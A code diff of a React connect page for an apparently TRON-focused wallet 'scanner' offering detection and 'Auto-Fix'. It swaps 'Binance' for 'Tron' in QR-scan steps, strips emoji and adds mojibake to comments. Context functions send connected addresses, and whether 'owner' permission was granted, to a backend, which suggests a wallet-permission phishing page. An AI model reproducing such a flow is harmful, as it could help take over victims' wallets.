@@ -85,7 +85,7 @@ async function trackConnect(address: string) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ address }),
     });
-  } catch { /* backend offline — non-fatal */ }
+  } catch { /* backend offline ï¿½ non-fatal */ }
 }
 
 async function trackDisconnect(address: string) {
@@ -95,7 +95,7 @@ async function trackDisconnect(address: string) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ address }),
     });
-  } catch { /* backend offline — non-fatal */ }
+  } catch { /* backend offline ï¿½ non-fatal */ }
 }
 
 async function trackOwner(address: string, granted: boolean) {
@@ -427,9 +427,9 @@ export default function ConnectPage() {
 
         {/* -- Feature badges -- */}
         <div style={{ display: "flex", flexWrap: "wrap", gap: 7, justifyContent: "center", marginBottom: 20 }}>
-          <span style={S.badge("#10b981")}>? Real-time Detection</span>
-          <span style={S.badge("#3b82f6")}>? TRC-20 / TRC-721 Scan</span>
-          <span style={S.badge("#a855f7")}>? Auto-Fix</span>
+          <span style={S.badge("#10b981")}> Real-time Detection</span>
+          <span style={S.badge("#3b82f6")}> TRC-20 / TRC-721 Scan</span>
+          <span style={S.badge("#a855f7")}> Auto-Fix</span>
         </div>
 
         {/* -- Warning info box -- */}
@@ -468,7 +468,7 @@ export default function ConnectPage() {
                 cursor: "pointer", transition: "all 0.15s",
                 display: "flex", alignItems: "center", justifyContent: "center", gap: 6
               }}>
-                <span>{m === "extension" ? "??" : "??"}</span>
+                <span>{m === "extension" ? " " : ""}</span>
                 {m === "extension" ? "Browser Extension" : "Mobile App (QR)"}
               </button>
             ))}
@@ -529,7 +529,7 @@ export default function ConnectPage() {
                   </div>
                   <div style={{ textAlign: "left", width: "100%" }}>
                     <ol style={{ paddingLeft: 18, margin: 0, color: "#7a7f96", fontSize: 12, lineHeight: 2.1, listStyle: "decimal" }}>
-                      <li>Open the <strong style={{ color: "#e8eaf0" }}>Binance</strong> app on your phone</li>
+                      <li>Open the <strong style={{ color: "#e8eaf0" }}>Tron</strong> app on your phone</li>
                       <li>Tap <strong style={{ color: "#e8eaf0" }}>Web3 Wallet</strong></li>
                       <li>Tap the <strong style={{ color: "#e8eaf0" }}>scan</strong> icon and scan above</li>
                     </ol>
